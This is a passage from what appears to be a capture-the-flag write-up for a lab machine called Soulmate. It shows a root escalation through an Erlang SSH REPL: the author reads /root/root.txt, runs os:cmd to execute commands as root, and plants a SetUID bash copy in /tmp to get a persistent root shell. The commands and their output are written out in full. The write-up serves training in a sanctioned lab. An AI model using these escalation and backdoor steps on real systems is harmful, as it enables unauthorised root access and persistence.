uptime()   -- print node uptime
xm(M)      -- cross reference check a module
y(File)    -- generate a Yecc parser
** commands in module i (interpreter interface) **
ih()       -- print help for the i module
true
```

The `ls` command works, and shows I can read in `/root`:

```console
(ssh_runner@soulmate)3> ls('/root').
.bash_history        .bashrc              .cache
.config              .erlang.cookie       .local
.profile             .selected_editor     .sqlite_history
.ssh                 .wget-hsts           root.txt
```

There’s no command in the list that can read a file, but this is just a list of convenience commands from the shell_default and c modules. Since the Erlang SSH daemon drops into a full Erlang REPL (Eshell), I have access to the entire standard library, including modules that interact with the OS. And since the daemon runs as root, any commands I run execute as root.

I can use the `file:read_file` function to read the flag:

```console
(ssh_runner@soulmate)10> {ok, Data} = file:read_file("/root/root.txt").
{ok,<<"8011bd8a************************\n">>}
```

Or the `os:cmd` function to run commands:

```console
(ssh_runner@soulmate)11> os:cmd('id').
"uid=0(root) gid=0(root) groups=0(root)\n"
```

To get a real root shell, I can make a SetUID / SetGID copy of `bash`:

```console
(ssh_runner@soulmate)12> os:cmd('cp /bin/bash /tmp/0xdf').
[]
(ssh_runner@soulmate)13> os:cmd('chmod 6777 /tmp/0xdf').
[]
```

Then, from a regular shell as ben (using `-p` to not drop privs):

```console
ben@soulmate:~$ /tmp/0xdf -p
0xdf-5.1#
```
